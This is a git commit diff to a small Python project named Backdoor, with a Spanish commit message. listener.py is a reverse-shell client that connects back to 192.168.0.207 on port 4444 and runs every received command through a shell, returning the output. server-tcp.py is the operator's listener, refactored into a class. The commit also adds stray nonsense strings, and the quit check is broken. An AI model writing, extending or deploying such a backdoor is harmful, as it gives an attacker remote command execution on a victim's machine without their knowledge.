f7a213e871b464446474684757a729f4562333ef
AzzDestrhoyer <fabriciososa006@gmail.com>
2022-04-24 17:14:09 -0300

    si

--- Backdoor/listener.py
+++ Backdoor/listener.py
@@ -8,14 +8,20 @@ port = 4444
 connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connect.connect((ip, port))
 
+def cambiar_directorio(path):
+	os.chdir(path)
+
+
 while True:
 	data = connect.recv(1024)
-	if data[:2].decode('utf-8') == 'cd':
+
+	if data[:2].decode('utf-8') == "cd":
 		os.chdir(data[3:].decode('utf-8'))
+
 	if len(data) > 0:
 		cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stderr= subprocess.PIPE, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
 		bytes = cmd.stdout.read() + cmd.stderr.read()
 		info_cliente = str(bytes)
-		connect.send(str.encode(info_cliente) + str.encode(os.getcwd() + ">"))
+		connect.send(str.encode(info_cliente))
 
 connect.close()
--- Backdoor/server-tcp.py
+++ Backdoor/server-tcp.py
@@ -3,30 +3,35 @@ import socket
 ip = "192.168.0.207"
 port = 4444
 
+class Listener:
+    def __init__(self):
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind((ip, port))
+        self.listener.listen(10)
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind((ip, port))
-listener.listen(10)
+    pqirpazñxmnasowpa = ""
 
+    def aceptar(self):
+        print("[+] Esperando por conexiones")
+        conn, addr = self.listener.accept()
+        print("[+] Tenemos una conexion de " + str(addr))
+        self.comandos(conn)
+        conn.close()
 
-def aceptar():
-    print("[+] Esperando por conexiones")
-    conn, addr = listener.accept()
-    print("[+] Tenemos una conexion de " + str(addr))
-    comandos(conn)
-    conn.close()
+    def comandos(self, conn):
+        while True:
+            cmd = input(">>")
 
-def comandos(conn):
-    while True:
-        cmd = input(">>")
+            if str.encode(cmd) == "q":break
 
-        if str.encode(cmd) == "q":break
+            if len(str.encode(cmd)) > 0:
 
-        if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                respuesta = str(conn.recv(1024))
+                print(respuesta)
+                
+escuchar = Listener()
+escuchar.aceptar()
 
-            conn.send(str.encode(cmd))
-            respuesta = str(conn.recv(1024))
-            print(respuesta)
-
-aceptar()
+vkdsvdscds = "mlvdsvlskpds"
